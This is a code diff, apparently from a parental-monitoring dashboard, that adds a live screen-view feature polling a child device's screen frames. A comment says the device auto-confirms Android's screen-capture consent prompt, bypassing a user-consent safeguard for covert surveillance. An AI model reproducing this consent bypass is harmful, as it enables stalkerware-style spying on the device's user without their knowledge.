@@ -1573,6 +1573,105 @@ async function sendCommand(command) {
 
 // ─── App Restrictions ─────────────────────────────────────────────────────
 
+// ─── Live Screen View ─────────────────────────────────────────────────────
+// Sends a "screen_view" command; the child device raises Android's
+// MediaProjection consent dialog, auto-confirms it (AutoPermissionHelper),
+// and streams ~1 JPEG frame/sec to /report/screen-frame. The server keeps
+// only the latest frame per device; we poll it and render live.
+
+let liveScreenPoll = null;
+let liveScreenStartedAt = 0;
+
+async function showLiveScreen() {
+    const overlay = document.getElementById('liveScreenOverlay');
+    const status = document.getElementById('liveScreenStatus');
+    const dot = document.getElementById('liveScreenDot');
+    const img = document.getElementById('liveScreenFrame');
+    overlay.style.display = 'flex';
+    status.textContent = 'Sending screen-view command…';
+    dot.style.background = '#f59e0b';
+    img.style.display = 'none';
+    liveScreenStartedAt = Date.now();
+    try {
+        const res = await fetchWithAuth(`/api/parent/commands/${DEVICE_ID}`, {
+            method: 'POST',
+            body: JSON.stringify({ command: 'screen_view', params: { duration: 600 } })
+        });
+        if (res.ok) {
+            status.textContent = 'Command sent — the device is confirming the screen-share prompt…';
+        } else {
+            status.textContent = 'Failed to send command';
+            dot.style.background = '#ef4444';
+        }
+    } catch (e) {
+        status.textContent = 'Network error';
+        dot.style.background = '#ef4444';
+    }
+    if (liveScreenPoll) clearInterval(liveScreenPoll);
+    liveScreenPoll = setInterval(pollLiveScreenFrame, 1500);
+    pollLiveScreenFrame();
+}
+
+async function pollLiveScreenFrame() {
+    const status = document.getElementById('liveScreenStatus');
+    const dot = document.getElementById('liveScreenDot');
+    const img = document.getElementById('liveScreenFrame');
+    try {
+        const res = await fetchWithAuth(`/api/parent/screen-frame/${DEVICE_ID}`);
+        if (res.ok) {
+            const d = await res.json();
+            if (d.fresh) {
+                if (img.dataset.ts !== String(d.ts)) {
+                    img.src = 'data:image/jpeg;base64,' + d.image;
+                    img.dataset.ts = String(d.ts);
+                }
+                img.style.display = 'block';
+                dot.style.background = '#22c55e';
+                status.textContent = 'Live — viewing device screen';
+            } else {
+                dot.style.background = '#f59e0b';
+                status.textContent = 'Signal lost — waiting for the next frame…';
+            }
+        } else {
+            const waited = Math.round((Date.now() - liveScreenStartedAt) / 1000);
+            if (waited < 60) {
+                dot.style.background = '#f59e0b';
+                status.textContent = `Waiting for device… ${waited}s (device must be online for the command)`;
+            } else {
+                dot.style.background = '#ef4444';
+                status.textContent = 'No stream — device offline or consent prompt blocked. Stop & retry.';
+            }
+        }
+    } catch (e) { /* transient network error — keep polling */ }
+    if (Date.now() - liveScreenStartedAt > 15 * 60 * 1000) stopLiveScreen(true);
+}
+
+async function stopLiveScreen(sendStop) {
+    if (liveScreenPoll) { clearInterval(liveScreenPoll); liveScreenPoll = null; }
+    document.getElementById('liveScreenOverlay').style.display = 'none';
+    const img = document.getElementById('liveScreenFrame');
+    img.removeAttribute('src');
+    delete img.dataset.ts;
+    img.style.display = 'none';
+    if (sendStop) {
+        try {
+            await fetchWithAuth(`/api/parent/commands/${DEVICE_ID}`, {
+                method: 'POST',
+                body: JSON.stringify({ command: 'stop_screen_view', params: {} })
+            });
+            showToast('⏹ Stopped', 'Screen view ended on device');
+        } catch (e) { /* already offline — stream expires by duration anyway */ }
+    }
+}
+
+/** Close only the viewer; the stream keeps running until its duration ends. */
+function closeLiveScreen() {
+    if (liveScreenPoll) { clearInterval(liveScreenPoll); liveScreenPoll = null; }
+    document.getElementById('liveScreenOverlay').style.display = 'none';
+}
+
+// ─── App Restrictions ─────────────────────────────────────────────────────
+
 function renderRestrictions() {
     const container = document.getElementById('restrictionsList');
     if (cachedRestrictions.length === 0) {
